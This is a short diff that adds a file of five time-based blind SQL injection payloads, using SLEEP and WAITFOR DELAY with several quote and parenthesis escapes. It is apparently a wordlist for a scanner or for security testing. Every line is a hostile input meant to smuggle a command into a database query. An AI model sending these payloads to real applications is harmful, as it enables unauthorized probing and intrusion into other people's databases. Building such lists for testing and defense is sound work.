@@ -1,0 +1,5 @@
+' OR SLEEP(5) --
+" OR SLEEP(5) --
+') OR SLEEP(5) --
+' WAITFOR DELAY '0:0:5' --
+" WAITFOR DELAY '0:0:5' --
